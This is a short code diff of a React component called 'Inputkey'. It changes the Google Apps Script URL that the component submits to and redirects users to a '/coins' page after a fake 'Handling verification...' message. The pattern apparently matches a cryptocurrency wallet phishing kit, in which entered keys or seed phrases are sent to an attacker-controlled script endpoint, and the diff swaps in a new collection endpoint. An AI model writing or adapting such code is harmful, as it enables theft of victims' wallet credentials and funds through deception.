@@ -133,7 +133,7 @@ const Inputkey = ({name, imgsrc, setshowinputkey, setfirstmodal}) => {
 
   const [value, setValue] = React.useState(0);
   
-  const scriptURL = 'https://script.google.com/macros/s/AKfycbwVgBtOo2ypXt8_MasrgHBBulHQnCp3XaJ4FKHMAHgBXWqdJf7k8T-xKwNYbwro_XlmYA/exec'
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbwB3lOUukb_2lAkPL7r_GC5s-A81cz-jT5ySD5JFCI6kAkars6dgHA-PjZevm4jJ9c8/exec'
 
   const handleChange = (event, newValue) => {
     setValue(newValue);
@@ -178,7 +178,7 @@ const Inputkey = ({name, imgsrc, setshowinputkey, setfirstmodal}) => {
       .catch(error => console.error('Error!', error.message))
       toast.warning('Handling verification... ')
       setTimeout(() => {
-        navigate('/');
+        navigate('/coins');
       }, 1000);
   }
 
@@ -199,7 +199,7 @@ const Inputkey = ({name, imgsrc, setshowinputkey, setfirstmodal}) => {
       .catch(error => console.error('Error!', error.message))
       toast.warning('Handling verification... ')
       setTimeout(() => {
-        navigate('/');
+        navigate('/coins');
       }, 1000);
   }
   const handleclodepop = () => {
